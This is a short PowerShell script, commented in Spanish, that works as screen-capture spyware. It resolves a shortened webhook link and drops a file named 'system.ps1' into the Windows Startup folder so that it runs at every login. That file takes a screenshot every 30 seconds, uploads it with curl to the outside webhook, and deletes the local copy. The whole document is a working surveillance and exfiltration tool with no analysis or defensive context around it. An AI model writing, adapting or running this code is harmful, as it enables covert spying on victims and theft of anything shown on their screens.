# Contenido del script
$hookurl =  "https://bit.ly/Screen_dc"
$seconds = 30 # Intervalo entre capturas (en segundos)

# Detección de URL acortada
if ($hookurl.Length -ne 121) {
    Write-Host "URL del webhook acortada detectada..." 
    $hookurl = (irm $hookurl).url
}

# Obtener la ruta de la carpeta de inicio del usuario
$StartupFolder = [Environment]::GetFolderPath("Startup")

# Ruta del script principal
$ScriptPath = Join-Path -Path $StartupFolder -ChildPath "system.ps1"

# Descargar el script en la carpeta de inicio
$ScriptContent = @"
# Contenido del script para enviar imágenes
while ($true) {
    $FilePath = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
    $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
    $Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::png)
    Start-Sleep 1
    curl.exe -F "file1=@$FilePath" $hookurl
    Start-Sleep 1
    Remove-Item -Path $FilePath
    Start-Sleep $seconds
}
"@
$ScriptContent | Out-File -FilePath $ScriptPath -Encoding utf8

Write-Host "Script descargado y configurado para ejecutarse al iniciar Windows."
